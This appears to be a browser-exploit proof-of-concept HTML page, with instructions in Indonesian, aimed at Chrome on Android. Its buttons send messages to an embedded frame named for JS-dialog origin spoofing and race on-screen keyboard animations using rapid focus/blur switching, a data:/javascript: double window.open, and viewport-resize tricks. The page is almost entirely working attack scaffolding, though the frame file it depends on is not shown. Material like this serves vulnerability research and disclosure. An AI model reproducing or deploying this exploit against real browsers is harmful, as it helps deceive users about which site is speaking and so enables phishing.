<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
body { font-family: sans-serif; padding: 12px; }
#controls { margin: 12px 0; }
button { margin: 6px; padding: 10px 14px; font-size: 16px; }
#testFrame { width: 100%; height: 420px; border: 1px solid #ccc; }
.instructions { font-size:14px; color:#333; margin-bottom:10px;}
</style>
</head>
<body>
  <h2>IME Animation Replacement — Aggressive PoC</h2>
  <p class="instructions">
    Buka halaman ini di <strong>Chrome on Android</strong>. 
    1) Tap input di bawah untuk munculkan keyboard. 
    2) Tekan "Run All Strategies" saat keyboard masih terbuka.
  </p>

  <input id="parentInput" placeholder="Tap here to open keyboard (tap ONCE)" style="font-size:18px;padding:10px;width:100%;">

  <div id="controls">
    <button id="runAll">Run All Strategies</button>
    <button id="strategy1">Strategy: fast focus-switch</button>
    <button id="strategy2">Strategy: focus→blur race</button>
    <button id="strategy3">Strategy: double open (data: then js:)</button>
    <button id="strategy4">Strategy: visualViewport-resize mimic</button>
  </div>

  <iframe id="testFrame" src="js-dialog-origin-spoof-frame.html" allow="payment" style="width:100%;height:420px"></iframe>

<script>
const frame = document.getElementById('testFrame');
const parentInput = document.getElementById('parentInput');

function post(cmd) {
  frame.contentWindow.postMessage(cmd, '*');
}

// Helper: run sequence of commands with short delays
function sequence(commands, baseDelay=8) {
  let t = 0;
  commands.forEach((c, i) => {
    t += (i===0 ? 0 : baseDelay);
    setTimeout(() => post(c), t);
  });
}

// STRATEGY 1: fast focus-switch across parent and iframe inputs
document.getElementById('strategy1').addEventListener('click', () => {
  // ensure keyboard present: parentInput should already be focused by user
  // Sequence: tell iframe to focus its input, then quickly tell parent to refocus -> rapid IME animations
  sequence(['focus-iframe-input', 'focus-parent-input', 'focus-iframe-input'], 12);
});

// STRATEGY 2: focus -> blur race to create IME show then hide quickly
document.getElementById('strategy2').addEventListener('click', () => {
  // Focus iframe input -> then ask iframe to blur it very quickly
  sequence(['focus-iframe-input', 'blur-iframe-input', 'focus-iframe-input', 'blur-iframe-input'], 10);
});

// STRATEGY 3: double open trick (data: then javascript:) from inside iframe — tries to race window.open + docwrite
document.getElementById('strategy3').addEventListener('click', () => {
  // instruct frame to perform the double-open/docwrite sequence
  post('do-double-open');
});

// STRATEGY 4: visualViewport resize mimic + immediate scroll/animation replacement
document.getElementById('strategy4').addEventListener('click', () => {
  post('visual-viewport-race');
});

// Run all strategies in quick succession (best shot)
document.getElementById('runAll').addEventListener('click', () => {
  // run them with micro delays
  sequence(['focus-iframe-input','do-double-open','visual-viewport-race','focus-iframe-input','blur-iframe-input'], 14);
});

// convenience: allow iframe to request parent to focus input
window.addEventListener('message', (ev) => {
  if (ev.data === 'focus-parent') {
    parentInput.focus();
  }
}, false);

</script>
</body>
</html>
